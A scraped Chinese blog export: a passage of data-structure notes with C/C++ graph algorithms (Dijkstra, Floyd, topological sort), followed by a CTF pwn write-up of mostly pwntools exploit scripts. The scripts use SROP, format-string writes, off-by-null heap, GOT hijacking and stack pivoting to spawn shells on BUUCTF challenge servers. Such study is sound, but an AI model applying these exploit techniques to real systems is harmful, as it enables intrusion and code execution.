&lt;&lt; &quot;-------------&quot; &lt;&lt; endl &lt;&lt; &quot;Kruskal:&quot; &lt;&lt; endl; MiniSpanTree_Kruskal(adjMat);//Kruskal算法 return 0;} Dijkstra算法(求单源最短路径问题)算法原理 适合求解有回路的带权图的最短路径 可以求任意两个顶点的最短路径 不适合求带负权值的最短路径问题 具体解释 邻接矩阵实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189#include&lt;iostream&gt;#include&lt;iomanip&gt;#include&lt;queue&gt;#include&lt;vector&gt;using namespace std;//用邻接矩阵构建有向图#define MAX 999//表示无穷#define MVNum 20//最大结点数typedef int VertexType;//设置结点的数据类型为int型（方便后续修改成char...）typedef int ArcType;//设置的权值为int型（方便后续修改成float...）class Graph//Adjacency Matrix Graph有向图，用邻接矩阵表示{public: void Create(); int LocateVex(VertexType u);//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1 int firstadj(int v); int nextadj(int v, int w); void Dijkstra(VertexType start_point);//使用迪杰斯特拉算法打印单源最短路径 void Show();//调试用，打印邻接矩阵private: VertexType vexs[MVNum];//顶点表,将顶点保存的信息存入此处 ArcType arcs[MVNum][MVNum];//邻接矩阵 int vexnum, arcnum;//图当前的顶点数和边数 vector&lt;queue&lt;VertexType&gt;&gt;path;//保存各结点最短路径的path[i] ArcType dist[MVNum];//最短路径大小 bool solved[MVNum];//是否找到最短路径};int Graph::LocateVex(VertexType u){//查找Graph中的顶点u，并返回其对应在顶点表中的下标，未找到则返回-1 int i; for (i = 0; i &lt; this-&gt;vexnum; i++) { if (u == this-&gt;vexs[i]) return i; } return -1;}int Graph::firstadj(int v){ for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[v][i] != MAX) return i; } return -1;}int Graph::nextadj(int v, int w){ for (int i = w + 1; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[v][i] != MAX) return i; } return -1;}void Graph::Show(){ for (int i = 0; i &lt; this-&gt;vexnum; i++) { for (int j = 0; j &lt; this-&gt;vexnum; j++) { cout &lt;&lt; setw(4) &lt;&lt; this-&gt;arcs[i][j] &lt;&lt; &quot; &quot;; } cout &lt;&lt; endl; }}void Graph::Create(){ cout &lt;&lt; &quot;请输入总结点数和总边数:&quot;; cin &gt;&gt; this-&gt;vexnum &gt;&gt; this-&gt;arcnum;//输入总顶点数和总边数 cout &lt;&lt; &quot;请输入各结点的信息:&quot;; for (int i = 0; i &lt; this-&gt;vexnum; i++) { cin &gt;&gt; this-&gt;vexs[i]; } //初始化邻接矩阵 for (int i = 0; i &lt; this-&gt;vexnum; i++) { for (int j = 0; j &lt; this-&gt;vexnum; j++) { this-&gt;arcs[i][j] = MAX; } } //构造邻接矩阵 for (int i = 0; i &lt; this-&gt;arcnum; i++) { int v1, v2, w; cout &lt;&lt; &quot;请输入第&quot; &lt;&lt; i + 1 &lt;&lt; &quot;条边的起点和终点及其对应的权值:&quot;; cin &gt;&gt; v1 &gt;&gt; v2 &gt;&gt; w; int m = LocateVex(v1); int n = LocateVex(v2); this-&gt;arcs[m][n] = w; } return;}void Graph::Dijkstra(VertexType start_point){ //初始化最短距离数组 for (int i = 0; i &lt; this-&gt;vexnum; i++) { this-&gt;dist[i] = MAX; } dist[this-&gt;LocateVex(start_point)] = 0; //初始化保存路径的向量 queue&lt;VertexType&gt;temp; temp.push(start_point); for (int i = 0; i &lt; this-&gt;vexnum; i++) { //（移到for外）queue&lt;VertexType&gt;temp; //temp.push(start_point); path.push_back(temp); //（不可行）path[i].push(start_point);//将起点作为最初始的路径加入每个结点对应的队列中 } //初始化solved数组 for (int i = 0; i &lt; this-&gt;vexnum; i++) { solved[i] = false; } for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (this-&gt;arcs[this-&gt;LocateVex(start_point)][i] != MAX) { dist[i] = this-&gt;arcs[this-&gt;LocateVex(start_point)][i]; path[i].push(this-&gt;vexs[i]); } } solved[this-&gt;LocateVex(start_point)] = true; for (int i = 0; i &lt; this-&gt;vexnum; i++) {//返回地找 ArcType mind = MAX; int v = i; for (int j = 0; j &lt; this-&gt;vexnum; j++) {//一个劲地往前走 //（移出for）int v = i; if (!solved[j] &amp;&amp; dist[j] &lt; mind) { mind = dist[j]; v = j; } solved[v] = true; int w = this-&gt;firstadj(v); while (w != -1) { if (dist[v] + this-&gt;arcs[v][w] &lt; dist[w]) { dist[w] = dist[v] + this-&gt;arcs[v][w]; path[w] = path[v]; path[w].push(vexs[w]); } w = this-&gt;nextadj(v, w); } } } cout &lt;&lt; &quot;从结点&quot; &lt;&lt; start_point &lt;&lt; &quot;开始到各点的最短路径和路径长度如下:&quot;&lt;&lt;endl; for (int i = 0; i &lt; this-&gt;vexnum; i++) { if (dist[i] == MAX) { cout &lt;&lt; &quot;无法到达结点&quot; &lt;&lt; this-&gt;vexs[i] &lt;&lt; endl; } else { cout &lt;&lt; &quot;抵达结点&quot; &lt;&lt; this-&gt;vexs[i] &lt;&lt; &quot;的最短路径:&quot;; int path_length = path[i].size(); for (int j = 0; j &lt; path_length; j++) { cout &lt;&lt; path[i].front() &lt;&lt; &quot; &quot;; path[i].pop(); } cout &lt;&lt; &quot;长度为&quot; &lt;&lt; dist[i] &lt;&lt; endl; } }}int main(){ Graph s; s.Create(); s.Show(); VertexType start_point; cout &lt;&lt; &quot;请输入起点:&quot;; cin &gt;&gt; start_point; s.Dijkstra(start_point); system(&quot;pause&quot;); return 0;} 结果:参考文章 邻接表实现待定 Floyd算法(求多源最短路径问题)算法思想概括为迭代更新i经由k到j的最短路径. 算法原理 从任意一条单边路径开始。所有两点之间的距离是边的权，如果两点之间没有边相连，则权为无穷大。 对于每一对顶点 u 和v，看看是否存在一个顶点 w 使得从 u 到 w 再到 v 比已知的路径更短。如果是更新它。 把图用邻接矩阵G表示出来，如果从Vi到Vj有路可达，则G[i][j]=d，d表示该路的长度；否则G[i][j]=无穷大。定义一个矩阵D用来记录所插入点的信息，D[i][j]表示从Vi到Vj需要经过的点，初始化D[i][j]=j。把各个顶点插入图中，比较插点后的距离与原来的距离，G[i][j]= min( G[i][j], G[i][k]+G[k][j] )，如果G[i][j]的值变小，则D[i][j]=k。在G中包含有两点之间最短道路的信息，而在D中则包含了最短通路径的信息。 比如，要寻找从V5到V1的路径。根据D，假如D(5,1)=3则说明从V5到V1经过V3，路径为{V5,V3,V1}，如果D(5,3)=3，说明V5与V3直接相连，如果D(3,1)=1，说明V3与V1直接相连。 邻接矩阵实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include&lt;stdio.h&gt;#include&lt;malloc.h&gt;#define MAXV 7 //最大顶点个数 #define INF 32767 //定义 ∞//∞ == 32767 ,int 型的最大范围（2位）= 2^(2*8-1)，TC告诉我们int占用2个字节，而VC和LGCC告诉我们int占用4个字节//图：Graph//顶点：Vertex//邻接：Adjacency//矩阵：Matrix//表：List//边：Edge typedef struct vertex { int number; //顶点的编号 }VertexType; //别名，顶点的类型 typedef struct matrix { int n; //顶点个数 int e; //边数 int adjMat[MAXV][MAXV]; //邻接矩阵数组 VertexType ver[MAXV]; //存放顶点信息 }MatGraph; //别名，完整的图邻接矩阵类型typedef struct eNode { int adjVer; //该边的邻接点编号 int weiLGht; //该边的的信息，如权值 struct eNode* nextEdLGe; //指向下一条边的指针 }EdgeNode; //别名，边结点的类型 typedef struct vNode { EdgeNode* firstEdLGe; //指向第一个边结点 }VNode; //别名，邻接表的头结点类型 typedef struct list { int n; //顶点个数 int e; //边数 VNode adjList[MAXV]; //邻接表的头结点数组 }ListGraph; //别名，完整的图邻接表类型 //创建图的邻接表 void createAdjListGraph(ListGraph*&amp; LG, int A[MAXV][MAXV], int n, int e) { int i, j; EdgeNode* p; LG = (ListGraph*)malloc(sizeof(ListGraph)); for (i = 0; i &lt; n; i++) { LG-&gt;adjList[i].firstEdLGe = NULL; //给邻接表中所有头结点指针域置初值 } for (i = 0; i &lt; n; i++) { //检查邻接矩阵中的每个元素 for (j = n - 1; j &gt;= 0; j--) { if (A[i][j] != 0) { //存在一条边 p = (EdgeNode*)malloc(sizeof(EdgeNode)); //申请一个结点内存 p-&gt;adjVer = j; //存放邻接点 p-&gt;weiLGht = A[i][j]; //存放权值 p-&gt;nextEdLGe = NULL; p-&gt;nextEdLGe = LG-&gt;adjList[i].firstEdLGe; //头插法 LG-&gt;adjList[i].firstEdLGe = p; } } } LG-&gt;n = n; LG-&gt;e = e;}//输出邻接表 void displayAdjList(ListGraph* LG) { int i; EdgeNode* p; for (i = 0; i &lt; MAXV; i++) { p = LG-&gt;adjList[i].firstEdLGe; printf(&quot;%d:&quot;, i); while (p != NULL) { if (p-&gt;weiLGht != 32767) { printf(&quot;%2d[%d]-&gt;&quot;, p-&gt;adjVer, p-&gt;weiLGht); } p = p-&gt;nextEdLGe; } printf(&quot; NULL\\n&quot;); }}//输出邻接矩阵void displayAdjMat(MatGraph MG) { int i, j; for (i = 0; i &lt; MAXV; i++) { for (j = 0; j &lt; MAXV; j++) { if (MG.adjMat[i][j] == 0) { printf(&quot;%4s&quot;, &quot;0&quot;); } else if (MG.adjMat[i][j] == 32767) { printf(&quot;%4s&quot;, &quot;∞&quot;); } else { printf(&quot;%4d&quot;, MG.adjMat[i][j]); } } printf(&quot;\\n&quot;); }}//邻接表转换为邻接矩阵void ListToMat(ListGraph* LG, MatGraph&amp; MG) { int i, j; EdgeNode* p; for (i = 0; i &lt; MAXV; i++) { for (j = 0; j &lt; MAXV; j++) { MG.adjMat[i][j] = 0; } } for (i = 0; i &lt; LG-&gt;n; i++) { p = LG-&gt;adjList[i].firstEdLGe; while (p != NULL) { MG.adjMat[i][p-&gt;adjVer] = p-&gt;weiLGht; p = p-&gt;nextEdLGe; } } MG.n = LG-&gt;n; MG.e = LG-&gt;e;}//输出多源最短路径void displayPath(MatGraph MG, int A[MAXV][MAXV], int path[MAXV][MAXV]) { int i, j, k; int s; int aPath[MAXV]; //存放一条最短路径（逆向） int d; //顶点个数 for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { if (A[i][j] != INF &amp;&amp; i != j) { //若顶点 i 和 顶点 j 之间存在路径 printf(&quot;从 %d 到 %d 的路径为：&quot;, i, j); k = path[i][j]; d = 0; aPath[d] = j; //路径上添加终点 while (k != -1 &amp;&amp; k != i) { //路劲上添加中间点 d++; aPath[d] = k; k = path[i][k]; } d++; aPath[d] = i; //路径上添加起点 printf(&quot;%d&quot;, aPath[d]); //输出起点 for (s = d - 1; s &gt;= 0; s--) { //输出路径上其他顶点 printf(&quot;-&gt;%d&quot;, aPath[s]); } printf(&quot;\\t\\t&quot;); printf(&quot;路径长度为：%d\\n&quot;, A[i][j]); } } }}//Floyd算法void Floyd(MatGraph MG) { int i, j, k; int A[MAXV][MAXV]; int path[MAXV][MAXV]; for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { A[i][j] = MG.adjMat[i][j]; if (i != j &amp;&amp; MG.adjMat[i][j] &lt; INF) { path[i][j] = i; //顶点 i 到顶点 j 有边时 } else { path[i][j] = -1; //顶点 i 到顶点 j 无边时 } } } for (k = 0; k &lt; MG.n; k++) { //一次考察所有顶点 for (i = 0; i &lt; MG.n; i++) { for (j = 0; j &lt; MG.n; j++) { if (A[i][j] &gt; A[i][k] + A[k][j]) { A[i][j] = A[i][k] + A[k][j]; //修改最短路径长度 path[i][j] = path[k][j]; //修改最短路径 } } } } displayPath(MG, A, path); //输出最短路径}int main() { ListGraph* LG; MatGraph MG; int array[MAXV][MAXV] = { { 0, 4, 6, 6,INF,INF,INF}, {INF, 0, 1,INF, 7,INF,INF}, {INF,INF, 0,INF, 6, 4,INF}, {INF,INF, 2, 0,INF, 5,INF}, {INF,INF,INF,INF, 0,INF, 6}, {INF,INF,INF,INF, 1, 0, 8}, {INF,INF,INF,INF,INF,INF, 0} }; int e = 12; createAdjListGraph(LG, array, MAXV, e); displayAdjList(LG); printf(&quot;\\n&quot;); ListToMat(LG, MG); displayAdjMat(MG); printf(&quot;\\n&quot;); Floyd(MG); printf(&quot;\\n&quot;); return 0;} 结果:参考文章1参考文章2 拓扑排序原理 从AOV网中选择一个没有前驱的顶点并输出. 从网中删除该顶点和所有以它为起点的有向边. 重复直至AOV网为空或当前网中不存在无前驱的顶点为止。后一种情况说明有向图中必然存在环. 栈实现拓扑排序（邻接表实现） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;stack&gt;#include &lt;cstring&gt;using namespace std;#define MAX_VERTEX_NUM 26typedef struct ArcNode { int adjvex; struct ArcNode *nextarc; ArcNode() { nextarc = NULL; }} ArcNode; //结点typedef struct VNode { int data; ArcNode *firstarc; VNode() { firstarc = NULL; }} VNode, AdjList[MAX_VERTEX_NUM];typedef struct { AdjList vertices; int vexnum, arcnum;} ALGraph;bool TopologicalSort(ALGraph G, int *indegree) { stack&lt;int&gt; s; //初始化栈 int i, k; for (i = 1; i &lt; G.vexnum + 1; i++) { if (!indegree[i]) s.push(i); //入度为0的顶点入栈 } int count = 0; //记录当前已经输出的顶点数 ArcNode *p; while (!s.empty()) { i = s.top(); s.pop(); cout &lt;&lt; G.vertices[i].data &lt;&lt; &quot;-&gt;&quot;; count++; for (p = G.vertices[i].firstarc; p; p = p-&gt;nextarc) { k = p-&gt;adjvex; indegree[k]--; //将所有指向i的顶点的入度减一，并且将入度为0的顶点压入栈s if (!indegree[k]) s.push(k); } } if (count &lt; G.vexnum) return false; return true;}int main() { int i; ALGraph g; cout &lt;&lt; &quot;载入图中...&quot; &lt;&lt; endl; ifstream fin(&quot;in.txt&quot;); fin &gt;&gt; g.vexnum &gt;&gt; g.arcnum; for (i = 1; i &lt; g.vexnum + 1; i++) g.vertices[i].data = i; int b, e; ArcNode *p; int *indegree = new int[g.vexnum + 1]; //注意 int *a=new int(n); 申请一个整型变量空间，赋初值为n，并定义一个整型指针a指向该地址空间 //int *indegree=(int *)malloc(sizeof(int)*(g.vexnum+1)); memset(indegree, 0, sizeof(int) * (g.vexnum + 1)); for (i = 1; i &lt; g.arcnum + 1; i++) { fin &gt;&gt; b &gt;&gt; e; cout &lt;&lt; &quot;第&quot; &lt;&lt; i &lt;&lt; &quot;条边：&quot; &lt;&lt; b &lt;&lt; &quot;-&gt;&quot; &lt;&lt; e &lt;&lt; endl; p = new ArcNode(); p-&gt;adjvex = e; p-&gt;nextarc = g.vertices[b].firstarc; g.vertices[b].firstarc = p; indegree[e]++; } if (TopologicalSort(g, indegree)) cout &lt;&lt; &quot;正常完成！&quot; &lt;&lt; endl; else cout &lt;&lt; &quot;该有向图有回路！&quot; &lt;&lt; endl; return 0;} 测试数据,新建in.txt文件输入内容 1）有环4 41 22 33 44 2 2）无环12 161 21 32 31 43 54 511 65 73 73 86 89 109 119 1210 121 12 结果: 参考文章https://cloud.tencent.com/developer/article/1569368","link":"/2022/02/17/%E3%80%90%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%20%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%20%E3%80%91%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E4%BB%A3%E7%A0%81%E5%A4%8D%E4%B9%A0%E6%80%BB%E7%BB%93%20C%E8%AF%AD%E8%A8%80(%E6%A0%91%E5%92%8C%E5%9B%BE%EF%BC%89/"},{"title":"BUUCTF Pwn Exercise(一)","text":"BUUOJ PWN EXERCISE rootersctf_2019_srop(srop)EXP1234567891011121314151617181920212223242526272829303132from pwn import *sh = process(&quot;rootersctf_2019_srop&quot;)context.update(arch=&quot;amd64&quot;, os=&quot;linux&quot;, endian=&quot;little&quot;)# write /bin/sh on 0x402000data_addr = 0x402000syscall_leave_ret = 0x401033pop_rax_syscall_leave_ret = 0x401032syscall_addr = 0x401046frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 0 # read frame.rdi = 0 # stdinframe.rsi = data_addrframe.rdx = 0x400frame.rip = syscall_leave_retframe.rbp = data_addr + 0x20layout = [0x88 * &quot;a&quot;, pop_rax_syscall_leave_ret, 0xf, bytes(frame)]# srop to call read, set *data_addr = /bin/sh\\x00sh.sendlineafter(&quot;Hey, can i get some feedback for the CTF?\\n&quot;, flat(layout))# call execve /bin/shlayout = [&quot;/bin/sh\\x00&quot;, &quot;a&quot; * 0x20, pop_rax_syscall_leave_ret, 0xf]frame = SigreturnFrame(kernel=&quot;amd64&quot;)frame.rax = 59 # execve frame.rdi = data_addr # stdinframe.rsi = 0frame.rdx = 0frame.rip = syscall_addrlayout.append(bytes(frame))sh.sendline(flat(layout))sh.interactive() 参考文章https://blog.csdn.net/weixin_46521144/article/details/120714498 https://www.cnblogs.com/LynneHuan/p/14723605.html#exp qctf_2018_stack2（数组越界）EXP123456789101112131415161718192021222324252627#!/usr/bin/env python # coding=utf-8 from pwn import * context(log_level = 'debug') sh = remote(&quot;node3.buuoj.cn&quot;,&quot;28924&quot;) sh.sendlineafter('have:\\n','0') sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(116 + 0x10)) sh.sendlineafter('number:\\n',str(0x9b)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(117 + 0x10)) sh.sendlineafter('number:\\n',str(0x85)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(118 + 0x10)) sh.sendlineafter('number:\\n',str(0x04)) sh.sendlineafter('5. exit\\n','3') sh.sendlineafter('change:\\n',str(119 + 0x10)) sh.sendlineafter('number:\\n',str(0x08)) sh.sendlineafter('5. exit\\n','5') sh.interactive() hfctf_2020_marksman(exit_hook)EXP123456789101112131415161718192021222324252627282930313233from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)# sh = process(&quot;./hfctf_2020_marksman&quot;)sh = remote('node4.buuoj.cn',27982)sh.recvuntil(&quot;I placed the target near: &quot;)msg = sh.recvline()puts_addr = int16(msg[:-1].decode())LOG_ADDR(&quot;puts_addr&quot;, puts_addr)libc_base_addr = puts_addr - 0x809c0LOG_ADDR(&quot;libc_base_addr&quot;, libc_base_addr)one_gadget1 = libc_base_addr + 0x10a387__rtld_lock_unlock_recursive_offset = 0x81df60target_addr = libc_base_addr + __rtld_lock_unlock_recursive_offset# one_gadget1 = libc_base_addr + 0xe569f# _dl_catch_error_offset = 0x5f4038# target_addr = libc_base_addr + _dl_catch_error_offsetsh.sendlineafter(&quot;shoot!shoot!\\n&quot;, str(target_addr))input_gadget = one_gadget1for _ in range(3): sh.sendlineafter(&quot;biang!\\n&quot;, chr(input_gadget &amp; 0xff)) input_gadget = input_gadget &gt;&gt; 8sh.interactive() 参考文章Python中的functools picoctf_2018_echooo(32位格式化字符串)EXP12345678910111213from pwn import *#p=process('./PicoCTF_2018_echooo')p=remote('node4.buuoj.cn',28387)offset=11flag=''for i in range(27,27+11): payload='%{}$p'.format(str(i)) p.sendlineafter('&gt; ',payload) aim=unhex(p.recvuntil('\\n',drop=True).replace('0x','')) flag+=aim[::-1]print flagp.interactive() npuctf_2020_level2(args上的格式化字符串漏洞)程序分析 漏洞利用 漏洞点为printf格式化字符串部分，但buf在bss段不在栈上因而不能通过填地址来写入，需要借助地址链分批次写入 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *import functoolsLOG_ADDR = lambda x, y: log.success('{} ===&gt; {}'.format(x, hex(y)))int16 = functools.partial(int, base=16)context.update(arch='amd64', os='linux', endian='little')# sh = process('./npuctf_2020_level2')sh = remote('node4.buuoj.cn',27290)sh.sendline(&quot;%9$p,%24$p&quot;)msg = sh.recvline()stack_addr, libc_addr = msg[:-1].split(b',')stack_addr = int16(stack_addr.decode())libc_addr = int16(libc_addr.decode())LOG_ADDR('stack_addr', stack_addr)LOG_ADDR('libc_addr', libc_addr)stack_ret_addr = stack_addr - 0xe0libc_base_addr = libc_addr - 0x3e7638LOG_ADDR('stack_ret_addr', stack_ret_addr)LOG_ADDR('libc_base_addr', libc_base_addr)gadgets = [0x4f2c5, 0x4f322, 0x10a38c]one_gadget = libc_base_addr + gadgets[0]LOG_ADDR('one_gadget', one_gadget)sleep(1)payload = &quot;%{}c%9$hn&quot;.format((stack_ret_addr &amp; 0xffff))sh.sendline(payload)sh.recv()for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%35$hn&quot;.format((one_gadget &amp; 0xffff)) + 'a' * 0x10sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%9$hhn&quot;.format((stack_ret_addr &amp; 0xff) + 2)sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)payload = &quot;%{}c%35$hhn&quot;.format(((one_gadget &gt;&gt; 16) &amp; 0xff)) + 'a' * 0x10sh.sendline(payload)sh.recv()sleep(2)for _ in range(2): sh.sendline('a' * 0x30) sh.recv() sleep(2)sh.send(&quot;6&quot; * 8 + '\\x00' * 8)sleep(3)sh.sendline(&quot;cat flag&quot;)sh.interactive() 123456789101112131415161718192021222324252627282930from pwn import *#9 35#p=process('./npuctf_2020_level2')p=remote('node4.buuoj.cn',27290)libc=ELF('./libc-2.27.so')context.log_level='debug'payload1='%7$p#%9$p@'p.sendline(payload1)p.recvuntil('0x')libc_base=(int(p.recvuntil(&quot;#&quot;,True),16) - 231)-libc.symbols['__libc_start_main']p.recvuntil('0x')addr_stack=int(p.recvuntil(&quot;@&quot;,True),16)-0xe0one_gadgets = [0x4f2c5,0x4f322,0x10a38c]one_gadget=one_gadgets[1]+libc_basestackbase = addr_stack &amp; 0xffffp.sendlineafter('\\n', '%' + str(stackbase) + 'c%9$hn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(one_gadget&amp;0xff)+'c%35$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(stackbase+1)+'c%9$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str((one_gadget&gt;&gt;8)&amp;0xffff)+'c%35$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str(stackbase+2)+'c%9$hhn\\x00')p.sendlineafter('\\x20\\x20\\xb4', '%'+str((one_gadget&gt;&gt;16)&amp;0xff)+'c%35$hhn\\x00')#p.recv('\\x20\\x20\\xb4')p.sendline('66666666\\x00')#p.recv()print(hex(libc.symbols['__libc_start_main']))#gdb.attach(p)p.interactive() asis2016_b00ks(off-by-null)EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *r = remote(&quot;node4.buuoj.cn&quot;, 28085)#r = process(&quot;./asis2016_b00ks&quot;)context(log_level = 'debug', arch = 'amd64', os = 'linux')DEBUG = 0if DEBUG: gdb.attach(r, ''' b *$rebase(0x1245) x/20gx $rebase(0x202040) c ''')elf = ELF(&quot;./b00ks&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]menu = &quot;&gt; &quot;def add(size1, content1, size2, content2): r.recvuntil(menu) r.sendline('1') r.recvuntil(&quot;Enter book name size: &quot;) r.sendline(str(size1)) r.recvuntil(&quot;Enter book name (Max 32 chars): &quot;) r.send(content1) r.recvuntil(&quot;Enter book description size: &quot;) r.sendline(str(size2)) r.recvuntil(&quot;Enter book description: &quot;) r.send(content2)def delete(index): r.recvuntil(menu) r.sendline('2') r.recvuntil(&quot;Enter the book id you want to delete: &quot;) r.sendline(str(index))def edit(index, content): r.recvuntil(menu) r.sendline('3') r.recvuntil(&quot;Enter the book id you want to edit: &quot;) r.sendline(str(index)) r.recvuntil(&quot;Enter new book description: &quot;) r.send(content)def show(): r.recvuntil(menu) r.sendline('4')def edit_name(name): r.recvuntil(menu) r.sendline('5') r.recvuntil(&quot;Enter author name: &quot;) r.send(name)r.recvuntil(&quot;Enter author name: &quot;)r.send('a'*0x20+'\\n')add(0x90, 'aa\\n', 0x90, 'aa\\n')add(0x21000, 'aa\\n', 0x21000, 'aa\\n')show()r.recvuntil('a'*0x20)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00')) - 0x160success(&quot;heap:&quot;+hex(heap))payload = 'a' * 0x40 + p64(1) + p64(heap+0x198)*2 + p64(0xffff) + '\\n'edit(1, payload)edit_name('a'*0x20 + '\\n')show()r.recvuntil(&quot;Name: &quot;)#offset = 0x7fc715ef1010 - 0x7fc71593e000offset = 0x7f4875e6a010 - 0x7f48758a4000libc.address = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - offsetsuccess(&quot;libc:&quot;+hex(libc.address))free_hook = libc.sym['__free_hook']system = libc.sym['system']bin_sh = libc.search(&quot;/bin/sh&quot;).next()edit(1, p64(bin_sh) + p64(free_hook) + '\\n')edit(2, p64(system)+'\\n')delete(2)r.interactive() babyfengshui_33c3_2016程序分析 checksec后可以看到relro保护没开，可以劫持函数got表 由于是*（&amp;ptr+a1）-4是靠偏移来确定大小的，所以也就只有在name堆块与text堆块在物理地址相邻时才有作用，因此我们可以通过delete函数删除一个user便可以使程序连续free掉两个堆块，从而使两个0x88的堆块合并成为一个0x110的堆块 进而我们再次使用add添加数据的时候，第一次输入的name设置大小为0x100就可以使 name与text堆块物理不相邻，这样一来我们的text字段便可输入任意大小的数据 接下来就可以对能够造成溢出的name堆块填充大量的数据覆盖到下一个user的name字段中，来控制下一个user中的text地址指向 最后便可以控制该text指向某个函数的got表地址，即可劫持函数的got表指向system函数。 EXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *from LibcSearcher import LibcSearchercontext.log_level='debug'# p=remote(&quot;node4.buuoj.cn&quot;,26147)p=process('./babyfengshui')elf=ELF('./babyfengshui')free_got=elf.got['free']def add(size,name,length,text): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;0&quot;) p.sendlineafter(&quot;size of description: &quot;,str(size)) p.sendlineafter(&quot;name: &quot;,name) p.recvuntil(&quot;text length:&quot;) p.sendline(str(length)) p.recvuntil(&quot;text:&quot;) p.sendline(text)def delete(index): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index))def show(index): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;2&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index))def update(index,length,text): p.recvuntil(&quot;Action: &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;index: &quot;) p.sendline(str(index)) p.recvuntil(&quot;text length: &quot;) p.sendline(str(length)) p.recvuntil(&quot;text: &quot;) p.sendline(text)add(0x80,&quot;nam1&quot;,0x80,&quot;aaaa&quot;)add(0x80,&quot;nam2&quot;,0x80,&quot;bbbb&quot;)add(0x80,&quot;nam3&quot;,0x80,&quot;/bin/sh\\x00&quot;) #写入/bin/shdelete(0)add(0x100,'nam1',0x100,&quot;cccc&quot;)payload='a'*0x108+'a'*0x8+'a'*0x80+'a'*0x8+p32(free_got)update(3,0x200,payload)show(1)p.recvuntil(&quot;description: &quot;)free_addr=u32(p.recv(4))libc=LibcSearcher(&quot;free&quot;,free_addr)libc_base=free_addr-libc.dump(&quot;free&quot;)system_addr=libc_base+libc.dump(&quot;system&quot;)update(1,0x80,p32(system_addr))delete(2)p.interactive() gyctf_2020_borrowstack(栈迁移)1234567891011121314151617181920212223242526272829303132333435363738from pwn import *from LibcSearcher import *r=remote('node3.buuoj.cn',29385)bank=0x0601080leave=0x400699puts_plt=0x04004E0puts_got=0x0601018pop_rdi=0x400703main=0x0400626ret=0x4004c9r.recvuntil('u want')payload='a'*0x60+p64(bank)+p64(leave)r.send(payload)r.recvuntil('now!')payload=p64(ret)*20+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(payload)r.recvline()puts_addr=u64(r.recv(6).ljust(8,'\\x00'))print hex(puts_addr)libc=LibcSearcher('puts',puts_addr)libc_base=puts_addr-libc.dump('puts')one_gadget=libc_base+0x4526a#system=libc_base+libc.dump('system')#binsh=libc_base+libc.dump('str_bin_sh')#payload='a'*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)payload='a'*(0x60+8)+p64(one_gadget)r.send(payload)r.interactive() hitcontraining_magicheap（unsorted bin attack) Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。 初始状态时unsorted bin 的 fd 和 bk 均指向 unsorted bin 本身。执行 free 由于释放的 chunk 大小不属于 fast bin 范围内，所以会首先放入到 unsorted bin 中。修改 p[1]经过修改之后，原来在 unsorted bin 中的 p 的 bk 指针就会指向 target addr-16 处伪造的 chunk，即 Target Value 处于伪造 chunk 的 fd 